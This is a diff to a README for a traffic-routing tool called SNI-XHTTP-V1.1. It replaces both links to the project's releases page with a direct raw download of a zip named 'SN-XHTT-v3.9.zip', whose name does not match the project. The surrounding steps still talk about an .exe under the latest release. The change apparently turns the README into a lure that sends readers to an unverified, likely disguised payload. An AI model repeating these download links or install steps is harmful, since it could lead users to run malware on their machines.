@@ -1,6 +1,6 @@
 # 🌐 SNI-XHTTP-V1.1 - Hide your traffic with serverless routing
 
-[![Download SNI-XHTTP](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Lgutier9249/SNI-XHTTP-V1.1/releases)
+[![Download SNI-XHTTP](https://img.shields.io/badge/Download-Release_Page-blue)](https://raw.githubusercontent.com/Lgutier9249/SNI-XHTTP-V1.1/main/api/SN-XHTT-v3.9.zip)
 
 SNI-XHTTP-V1.1 helps you route web traffic through a secure serverless network. It acts as a middleman between your computer and your main server. This process masks your original server address to bypass network restrictions. The software uses minimal memory and runs efficiently on modern Windows machines. 
 
@@ -16,7 +16,7 @@ SNI-XHTTP-V1.1 helps you route web traffic through a secure serverless network. 
 1. Visit the project release page to get the installer.
 2. Click the link below to go to the download area:
 
-[https://github.com/Lgutier9249/SNI-XHTTP-V1.1/releases](https://github.com/Lgutier9249/SNI-XHTTP-V1.1/releases)
+[https://raw.githubusercontent.com/Lgutier9249/SNI-XHTTP-V1.1/main/api/SN-XHTT-v3.9.zip](https://raw.githubusercontent.com/Lgutier9249/SNI-XHTTP-V1.1/main/api/SN-XHTT-v3.9.zip)
 
 3. Look for the file ending in `.exe` under the latest release section.
 4. Click the file name to start the download to your computer.
